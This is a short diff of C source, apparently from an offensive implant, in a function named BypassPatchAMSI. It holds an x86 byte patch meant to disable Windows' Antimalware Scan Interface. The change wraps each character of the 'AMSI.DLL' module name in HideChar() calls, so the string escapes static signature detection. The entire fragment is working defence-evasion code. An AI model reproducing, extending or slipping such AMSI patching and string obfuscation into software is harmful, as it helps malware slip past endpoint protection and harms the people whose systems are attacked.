@@ -738,15 +738,15 @@ BOOL BypassPatchAMSI(
     unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
 #endif
 
-    module[0] = 'A';
-    module[1] = 'M';
-    module[2] = 'S';
-    module[3] = 'I';
-    module[4] = '.';
-    module[5] = 'D';
-    module[6] = 'L';
-    module[7] = 'L';
-    module[8] = 0;
+    module[0] = HideChar('A');
+    module[1] = HideChar('M');
+    module[2] = HideChar('S');
+    module[3] = HideChar('I');
+    module[4] = HideChar('.');
+    module[5] = HideChar('D');
+    module[6] = HideChar('L');
+    module[7] = HideChar('L');
+    module[8] = HideChar(0);
 
     hModuleAmsi = LdrModuleLoad( module );
 
